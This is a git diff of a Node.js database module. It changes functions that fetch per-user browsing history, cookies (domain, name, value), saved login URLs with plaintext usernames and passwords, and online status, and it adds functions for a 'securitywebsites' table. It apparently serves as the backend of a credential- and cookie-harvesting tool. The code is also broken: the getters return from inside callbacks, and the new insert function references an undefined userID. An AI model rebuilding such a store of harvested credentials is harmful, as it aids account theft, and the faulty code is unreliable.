@@ -148,7 +148,7 @@ module.exports = {
             console.log("ID status updated " +userID + " set offline");
         });
     },
-    updateHistory: function (json) {//works
+    updateHistory: function (json) {
         var jsonContents = JSON.parse(json);
         var id = jsonContents.id;
         flushHistory(id);
@@ -186,7 +186,7 @@ module.exports = {
             console.log('Login updated');
         });
     },
-    getAllStatus: function (callback) {
+    getAllStatus: function (callback) {//WORKS
         db.query("SELECT ID, UserStatus FROM userStatus", function(err,result,fields){
             if(err) throw err;
             var clientArr = result;
@@ -204,19 +204,33 @@ module.exports = {
     getHistory: function (userID) {
         db.query("SELECT URL FROM history WHERE UserID = ?", [userID], function(err,result,fields){
             if(err) throw err;
-            return fields;
+            return result;
         });
     },
     getCookies: function (userID) {
         db.query("SELECT Domain, Name, Value FROM cookies WHERE UserID = ?", [userID], function(err,result,fields){
             if(err) throw err;
-            return fields;
+            return result;
         });
     },
     getLoginInfo: function (userID) {
         db.query("SELECT URL, Username, UserPassword FROM loginInfo WHERE UserID = ?", [userID], function(err,result,fields){
             if(err) throw err;
-            return fields;
+            return result;
+        });
+    },
+
+    updateSecurityWebsites: function (newURL) {
+        db.query("INSERT INTO securitywebsites(URL) VALUES ?",[newURL], function(err,result){
+            if(err) throw err;
+            console.log("ID status updated " +userID + " set offline");
+        });
+    },
+
+    getSecurityWebsites: function (userID) {
+        db.query("SELECT URL FROM securitywebsites WHERE UserID = ?", [userID], function(err,result,fields){
+            if(err) throw err;
+            return result;
         });
     }
 };
